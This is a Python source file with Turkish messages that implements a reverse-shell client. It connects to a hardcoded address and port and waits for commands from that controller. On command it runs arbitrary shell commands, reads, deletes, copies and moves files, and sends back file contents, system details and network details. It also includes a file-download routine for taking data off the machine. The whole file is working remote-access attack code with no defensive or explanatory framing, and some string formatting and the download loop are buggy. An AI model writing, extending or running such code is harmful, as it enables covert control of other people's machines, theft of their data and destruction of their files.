import socket
import subprocess
import os
import psutil
from psutil._common import bytes2human
import platform
import shutil
from colorama import Fore, Style



def get_os_info():
    os_info = platform.platform()
    return os_info

def get_cpu_info():
    cpu_info = ""
    for num, percent in enumerate(psutil.cpu_percent(percpu=True)):
        cpu_info += f"CPU{num}: {percent}%\n"
    return cpu_info


def get_memory_info():
    memory_info = ""
    for part in psutil.disk_partitions(all=False):
        if os.name == "nt" and ('cdrom' in part.opts or not part.fstype):
            usage = psutil.disk_usage(part.mountpoint)
            memory_info += f"Device: {part.device}, Total: {bytes2human(usage.total)}, Used: {bytes2human(usage.used)}, Free: {bytes2human(usage.free)}, Use: {usage.percent}%\n"
        elif os.name == "posix" and ('mount' in part.opts or not part.fstype):
            usage = psutil.disk_usage(part.mountpoint)
            memory_info += f"Device: {part.device}, Total: {bytes2human(usage.total)}, Used: {bytes2human(usage.used)}, Free: {bytes2human(usage.free)}, Use: {usage.percent}%\n"
    return memory_info


def get_network_info():
    network_info = ""
    duplex_map = {
        psutil.NIC_DUPLEX_FULL: "full",
        psutil.NIC_DUPLEX_HALF: "half",
        psutil.NIC_DUPLEX_UNKNOWN: "?",
    }
    af_map = {
        socket.AF_INET: 'IPv4',
        socket.AF_INET6: 'IPv6',
    }

    interfaces = psutil.net_if_addrs()

    for interface, addresses in interfaces.items():
        network_info += f"Ağ Arayüzü: {interface}\n"
        for addr in addresses:
            network_info += f"  Adres Türü: {af_map.get(addr.family, addr.family)}\n"
            network_info += f"  Adres: {addr.address}\n"
            if addr.broadcast:
                network_info += f"    Yayın Adresi: {addr.broadcast}\n"
            if addr.netmask:
                network_info += f"    Ağ Maskesi: {addr.netmask}\n"

    return network_info
    

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout.strip()
        else:
            return f"Error: {result.stderr.strip()}"
    except Exception as e:
        return f"Error: {str(e)}"
        
        
      
        
      


def main():
    ip = "192.168.1.36"
    port = 1604
    
    int(port)

    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, port))
            print("Sunucuya bağlanıldı.{Fore.GREEN}[√]{Style.RESET_ALL}")

            while True:
                command = s.recv(4096).decode()

                if command.strip() == 'exit':
                    break

                elif command.strip() == 'execute':
                    komut = s.recv(8192).decode()
                    output = execute_command(komut)
                    s.send(output.encode())
                    

                elif command.strip().startswith('cat') or command.strip().startswith("type"):
                    dosya_adi = command.split(" ")[1]
                    try:
                        with open(dosya_adi, "r") as dosya:
                            icerik = dosya.read()
                        s.sendall(icerik.encode())
                        
                    except FileNotFoundError:
                        s.send("Dosya bulunamadı".encode())
                        
                    except Exception as e:
                        s.send(f"Hata: {str(e)}".encode())
                        

                elif command.strip().startswith('rm') or command.strip().startswith('del'):
                    dosya_adi = command.split(" ")[1]
                    try:
                        os.remove(dosya_adi)
                        s.send(f"{dosya_adi} başarıyla silindi.{Fore.GREEN}[√]{Style.RESET_ALL}".encode())
                        
                    except FileNotFoundError:
                        s.send(f"{dosya_adi} bulunamadı".encode())
                        
                    except Exception as e:
                        s.send(f"Hata: {str(e)}".encode())
                        

                elif command.strip().startswith('ls') or command.strip().startswith('dir'):
                    dosyalar = os.listdir()
                    if dosyalar:
                        s.send("\n".join(dosyalar).encode())
                        
                    else:
                        s.send("Dizin boş".encode())
                        

                elif command.strip().startswith('cd'):
                    hedefklasor = command.split(" ")[1]
                    try:
                        os.chdir(hedefklasor)
                        s.send(f"Dizin değiştirildi: {os.getcwd()}{Fore.GREEN}[√]{Style.RESET_ALL}".encode())
                        
                    except FileNotFoundError:
                        s.send("Hata: Dizin bulunamadı".encode())
                        
                    except Exception as e:
                        s.send(f"Hata: {str(e)}".encode())
                        

                elif command.strip().startswith('mkdir'):
                    hedefklasor = command.split(" ")[1]
                    try:
                        os.mkdir(hedefklasor)
                        s.send(f"{hedefklasor} başarıyla oluşturuldu.{Fore.GREEN}[√]{Style.RESET_ALL}".encode())
                        
                    except FileExistsError:
                        s.send(f"{hedefklasor} zaten var.".encode())
                        
                    except Exception as e:
                        s.send(f"Hata: {str(e)}".encode())
                        

                elif command.strip().startswith("touch") or command.strip().startswith("type nul >"):
                    dosyaisim = command.split(" ")[1]
                    with open(dosyaisim, "w") as dosya:
                        pass

                    s.send("Dosya Oluşturuldu.{Fore.GREEN}[√]{Style.RESET_ALL}".encode())
                    

                elif command.strip().startswith("echo"):
                    komut_parcalari = command.split(" ")
                    dosya_isim_index = komut_parcalari.index(">>") + 1
                    dosya_isim = komut_parcalari[dosya_isim_index]
                    metin = " ".join(komut_parcalari[1:dosya_isim_index - 1])
                    with open(dosya_isim, "a") as dosya:
                        dosya.write(metin)
                        s.send("Metin dosya sonuna eklendi.{Fore.GREEN}[√]{Style.RESET_ALL}".encode())
                        
                        
                elif command.strip().startswith("cp") or command.strip().startswith('copy'):
                    parcala = command.split(" ")[1]
                    parcala2 = command.split(" ")[2]
                    try:
                        shutil.copy(parcala, parcala2)
                        s.send("Dosya Başarılı şekilde kopyalandı.{Fore.GREEN}[√]{Style.RESET_ALL}".encode())
                    
                    except FileNotFoundError:
                        s.send("Belirtilen dosya bulunamadı.".encode())
            
                    except PermissionError:
                        s.send("İzin hatası: Dosyayı kopyalamak için yeterli izniniz yok.".encode())
                        

                elif command.strip().startswith("mv") or command.strip().startswith('move'):
                    parcala = command.split(" ")[1]
                    parcala2 = command.split(" ")[2]
                    try:
                        shutil.move(parcala, parcala2)
                        s.send("Dosya başarılı bir şekilde taşındı.{Fore.GREEN}[√]{Style.RESET_ALL} ".encode())
                        
                    except FileNotFoundError:
                        s.send("Belirtilen dosya bulunamadı.".encode())
                    except PermissionError:
                        s.send("İzin hatası: Dosyayı taşımak için yeterli izniniz yok.".encode())

                elif command.strip().startswith("whoami"):
                    cikti = subprocess.run(['whoami'], capture_output=True, text=True)
                    s.send(cikti.stdout.encode())

                elif command.strip().startswith("ifconfig") or command.strip().startswith('ipconfig'):
                    x = get_network_info()
                    s.send(x.encode())

                elif command.strip().startswith("cpu"):
                    x = get_cpu_info()
                    s.send(x.encode())

                elif command.strip().startswith("memory"):
                    x = get_memory_info()
                    s.send(x.encode())
                    
                elif command.strip().startswith("osinfo"):
                    os_info = get_os_info()
                    s.send(os_info.encode())
                    
                elif command.strip().startswith('download'):
                    file_name = s.recv(8192).decode()
                    file_path = os.path.join(os.getcwd(), file_name)  
                    if os.path.exists(file_path):
                        file_size = os.path.getsize(file_path)
                        s.send(f'{file_name}:{file_size}'.encode())
                        with open(file_path, 'rb') as file:
                            while True:
                                data = file.read(8192)
                                if not data:
                                    break
                                    s.send(data)
                                    
                                    
                    else:
                        s.send('Dosya bulunamadı'.encode())
                        
                                          
                                      
                    
                    
                    
                else:
                    s.send("Geçersiz komut.".encode())

    print("Bağlantı kesildi.")


if __name__ == "__main__":
    main()
